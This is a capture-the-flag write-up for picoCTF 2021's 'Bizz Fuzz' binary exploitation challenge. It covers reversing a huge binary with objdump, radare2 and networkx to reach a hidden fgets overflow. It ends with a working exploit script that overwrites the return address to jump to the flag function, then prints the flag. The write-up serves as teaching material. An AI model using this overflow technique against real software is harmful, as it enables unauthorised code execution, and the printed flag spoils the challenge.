---
title: picoCTF 2021 - Bizz Fuzz (pwn)
date: 2021-03-30
slug: /writeups/picoctf-2021-bizz-fuzz
excerpt: Automated analysis of a large binary
author: Darin Mao
---

Bizz Fuzz was a binary exploitation challenge from picoCTF 2021. Despite being in the binary category and involving a buffer overflow, the majority of the challenge was actually reversing, which required some unusual methods to do efficiently.

# Description
> FizzBuzz was too easy, so I made something a little bit harder... There's a buffer overflow in this problem, good luck finding it! `nc mercury.picoctf.net 4636`
>
> Hints:
> - What functions are imported? Where are they used? And what do these strings mean?
> - Woah, some of these functions seem similar, can you figure them out one group at a time?
> - If fancy new dissassemblers take too long, there's always objdump!
> - Have you heard of binary instrumentation before? It might keep you from running in circles. No promises.
> - ANGR is another great framework.

Files:
- [vuln](https://mercury.picoctf.net/static/c0b3659d7bea50b48c740f3d4c80a0e7/vuln)

We're given a big binary that supposedly has a buffer overflow somewhere. Unfortunately, the binary has too many functions and manual analysis of all of them is impossible.

# Finding buffer overflow
Following the hint, we run the following to find the biggest `size` passed to `fgets`:

```
objdump -j .text -d -Mintel vuln | grep -B 3 fgets | grep 'push   0x'
```

Parsing the output with a python script, we find a size of 348 at `0x808aea7`, which was much higher than any of the others. Sure enough, 348 bytes are read into a buffer only 87 bytes big:

```c
void FUN_0808ae73(void)

{
  char local_67 [87];
  int local_10;

  local_10 = do_fizzbuzz(0x14);
  if (local_10 == 1) {
    fgets(local_67,0x15c,stdin);
  }
```

So now that we know where the buffer overflow is, how do we get to it?

# Call tree
After many tools failed to analyze this huge binary, we tried radare2. `agCj` generates a global call tree almost instantly, and we can throw all the nodes into `networkx` to find a path.

```python
import json
import networkx as nx

G = nx.DiGraph()

with open('output.json', 'r') as f:
  data = json.load(f)

for node in data:
  if node['name'] == 'fcn.08048590': continue
  for i in node['imports']:
    if i == 'fcn.08048590':
      continue
    G.add_edge(node['name'], i)

print(nx.shortest_path(G, 'fcn.0814c22c', 'fcn.0808ae73'))
```

Great, now we have a path:
```
['fcn.0814c22c', 'fcn.08140c2e', 'fcn.08143ffd', 'fcn.081313b8', 'fcn.08109f08', 'fcn.0808ae73']
```

# Following path
We initially thought that just answering fizzbuzz correctly many times would eventually lead to where we wanted. However, this was not the case. We managed to get to the first function at `0x8140c2e` but not any further.

```
['1', '2', 'fizz', '1', '2', 'fizz', '4', 'buzz', 'fizz', '1', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '11', '1', '2', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '11', '1', '2', 'fizz', '1', '2', 'fizz', '4', 'buzz', 'fizz', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '11', 'fizz', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '11', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '11', 'fizz', '13', '14', 'fizzbuzz', '16', '17', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '11', 'fizz', '13', '14', '1', '2', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '11', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '11', 'fizz', '13', '14', 'fizzbuzz', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '11', 'fizz', '13', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '11', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '11', 'fizz', '13', '14', 'fizzbuzz', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '11', 'fizz', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '11', 'fizz', '13', '14', 'fizzbuzz', '16', '1', '2', 'fizz', '4', 'buzz', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '11', 'fizz', '13', '1', '2', 'fizz', '4', 'buzz', 'fizz', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '11', 'fizz', '13', '14', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '11', 'fizz', '1', '2', 'fizz', '4', 'buzz', 'fizz', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '11', 'fizz', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '11', 'fizz', '13', '14', 'fizzbuzz', '16', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '11', 'fizz', '13', '14', 'fizzbuzz', '16', '17', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', 'fizz', 'buzz', '1', '2', 'fizz', '4', '1', '2', 'fizz', '4', 'buzz', 'fizz', '7', '8', '1', '2', 'fizz', '4', 'buzz', 'fizz', '1', '2', 'fizz', '4']
```

We can manually analyze `0x08140c2e`

```c
void FUN_08140c2e(void)

{
  int iVar1;

  iVar1 = do_fizzbuzz(3);
  if (iVar1 != 3) {
    FUN_0813326e();
    iVar1 = do_fizzbuzz(7);
    if (iVar1 != 7) {
      FUN_08137124();
      iVar1 = do_fizzbuzz(9);
      if (iVar1 != 9) {
        FUN_0813ca30();
```

The `do_fizzbuzz` function simply runs fizzbuzz starting from 1 and returns the first problem number we get wrong. The next function in our path, `0x08143ffd`, is somewhere in the middle after many of these steps. Each function called in each step is a similar function with different arguments to `do_fizzbuzz`. Furthermore, many of the other functions in the path look like this as well. Thus, we have a plan to get to the next function:

- answer zero questions correctly to pass the != check
- in the child function called, get the correct number of fizzbuzz correct to fail the != check and return back to the current function immediately

We can write another script with radare2 to do this:

```python
import r2pipe

r = r2pipe.open('./vuln')
r.cmd('Po bizz')

def decode_func(addr):
  r.cmd(f's {hex(addr)}')
  calls = r.cmdj('agcj')
  if 'sym.imp.fgets' in calls[0]['imports']:
    return [(-1, None)]
  func = r.cmdj('pdfj')
  ops = func['ops']
  fizz = []
  for i, op in enumerate(ops):
    if op['type'] == 'push':
      if ops[i+5]['type'] == 'nop':
        break
      fizz.append((op['val'], ops[i+5]['jump']))
  return fizz

nums = []

funcs = [0x08140c2e, 0x08143ffd, 0x081313b8, 0x08109f08]
for i, addr in enumerate(funcs[:-1]):
  func = decode_func(addr)
  target = funcs[i+1]
  for correct, child in func:
    nums.append(-1)
    if child == target:
      break
    nums.append(decode_func(child)[0][0])

print(nums)
```

This produces a list of numbers, where each number is the necessary return value of a call to `do_fizzbuzz`, and -1 means getting nothing correct.

```
[-1, 10, -1, 8, -1, 11, -1, 5, -1, 16, -1, 13, -1, 3, -1, 7, -1, 8, -1, 13, -1, 11, -1, 7, -1, 8, -1, 5, -1, 10, -1, 13, -1, 4, -1, 5, -1, 12, -1, 13, -1, 3, -1, 16, -1, 2, -1, 12, -1, 4, -1, 2, -1, 18, -1, 4, -1, 5, -1, 2, -1, 3, -1, 13, -1, 4, -1, 11, -1, 7, -1, 9, -1, 7, -1, -1, 2, -1, -1, 3, -1, 17, -1, 13, -1, 5, -1, 7, -1, 3, -1, 7, -1, 7, -1, 6, -1, 4, -1, 12, -1, 13, -1, 5, -1, 7, -1, 13, -1, 2, -1, 12, -1, 11, -1, 9, -1, 14, -1, 4, -1, 5, -1]
```

Trying this in the debugger, we reach the `0x08109f08` function, which looks a bit different.

```c
void FUN_08109f08(void)

{
  char local_67 [87];
  int local_10;

  local_10 = do_fizzbuzz(0x2e);
  if (local_10 == 1) {
    fgets(local_67,0x44,stdin);
  }
  if (local_10 == 2) {
    fgets(local_67,0x1c,stdin);
  }
  if (local_10 != 3) {
    if (local_10 == 4) {
      fgets(local_67,0x43,stdin);
    }
    if (local_10 == 5) {
      FUN_0808ae73();
    }
```

We would like to reach `0x0808ae73`, so we extend our list with 5. Now we are in the vulnerable function.

```c
void FUN_0808ae73(void)

{
  char local_67 [87];
  int local_10;

  local_10 = do_fizzbuzz(0x14);
  if (local_10 == 1) {
    fgets(local_67,0x15c,stdin);
  }
```

Thus, we extend our list with -1. Now the challenge is just a simple buffer overflow, and we can return to the flag function at `0x08048656`.

```python
fizzbuzz = lambda i: "fizzbuzz"[i*i%3*4:8--i**4%5] or str(i)

# gets to 0x08140c2e
answers = ['1', '2', 'fizz', '1', ...]

for ans in answers:
  r.sendlineafter('?', ans)

# gets to vulnerable function
additional = [-1, 10, -1, 8, -1, 11, -1, ...]
additional.extend([5, -1])
for n in additional:
  if n == -1:
    r.sendlineafter('?', 'meowo')
  else:
    for k in range(n-1):
      r.sendlineafter('?', fizzbuzz(k+1))

r.sendline(b'A'*112+p32(0x08048656))
```

# Flag
```
picoCTF{y0u_found_m3}
```
